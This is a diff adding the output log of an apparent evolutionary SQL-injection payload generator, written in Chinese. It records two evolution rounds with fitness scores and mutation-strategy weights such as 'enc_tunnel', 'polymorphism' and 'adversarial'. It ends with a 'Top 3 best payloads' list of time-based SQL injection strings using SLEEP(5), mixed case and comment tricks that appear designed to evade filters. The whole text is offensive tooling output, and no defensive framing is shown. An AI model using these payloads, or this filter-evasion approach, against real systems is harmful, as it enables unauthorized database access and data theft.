@@ -1,0 +1,24 @@
+=== 接入元基因库（L4 认知策略基因反馈桥）===
+
+--- 第 1 次进化（冷启动，公平探索）---
+第1次 best_fitness=0.682, 已写回 L4 基因
+
+--- 第 2 次进化（读回 L4 先验，偏置策略选择）---
+第2次 best_fitness=0.683, L4 先验权重={'analogy': 0.5, 's_substitute': 1.0, 's_combine': 1.0, 's_adapt': 1.0, 's_modify': 2.0, 's_put': 1.0, 's_eliminate': 1.25, 's_reverse': 1.0, 'reverse_eng': 1.0, 'first_principle': 0.5, 'boundary': 0.5, 'redundancy': 1.0, 'negative_space': 1.0, 'proto_downgrade': 1.0, 'temporal': 0.5, 'enc_tunnel': 1.0, 'chunked': 1.0, 'polymorphism': 1.0, 'grafting': 1.0, 'adversarial': 1.0}
+
+=== L4 认知策略基因统计 ===
+{
+  "total_vuln_types": 1,
+  "total_strategies": 4,
+  "total_executions": 10,
+  "total_target_patterns": 0,
+  "total_cognitive_strategies": 13,
+  "best_strategy": null,
+  "best_rate": 0.0,
+  "blind_spots": 0
+}
+
+=== Top 3 最优 Payload ===
+1. [0.683] 1"ANDSLEEP(5)--/**/1"ANDSLEEP(5)--  (lineage=['s_combine', 's_eliminate', 's_substitute'])
+2. [0.683] 1'aNdSlEeP(5)--/**/1'AnDsLeEp(5)--  (lineage=['s_eliminate', 's_substitute', 's_reverse', 's_substitute'])
+3. [0.683] 1'aNdSlEeP(5)--/**/1'AnDsLeEp(5)--  (lineage=['s_eliminate', 's_substitute', 's_reverse', 's_substitute'])
